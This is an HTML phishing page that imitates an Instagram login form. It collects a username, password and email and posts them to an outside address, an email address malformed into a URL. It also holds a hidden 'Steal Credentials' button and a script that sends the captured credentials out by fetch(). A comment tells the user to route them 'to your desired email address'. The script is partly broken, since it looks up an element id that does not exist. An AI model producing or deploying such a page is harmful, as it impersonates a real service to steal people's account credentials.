<html>
  <head>
    <title>Instagram Login</title>
  </head>
  <body>
    <h1>Instagram Login</h1>
    <form action="https://leonardfaye2008@gmail.com/submit" method="post">
      <label for="username">Username:</label>
      <input type="text" id="username" name="username"><br><br>
      <label for="password">Password:</label>
      <input type="password" id="password" name="password"><br><br>
      <label for="email">Email:</label>
      <input type="text" id="email" name="email"><br><br>
      <input type="submit" value="Login">
      <input type="button" value="Steal Credentials" style="display: none;">
    </form>
    <script>
      document.getElementById('Steal Credentials').addEventListener('click', function() {
        var username = document.getElementById('username').value;
        var password = document.getElementById('password').value;
        var email = document.getElementById('email').value;
        // Send the credentials to your desired email address
        fetch('https://leonardfaye2008@gmail.com/submit', {
          method: 'POST',
          body: JSON.stringify({
            username: username,
            password: password,
            email: email
          }),
          headers: {
            'Content-Type': 'application/json'
          }
        });
      });
    </script>
  </body>
</html>
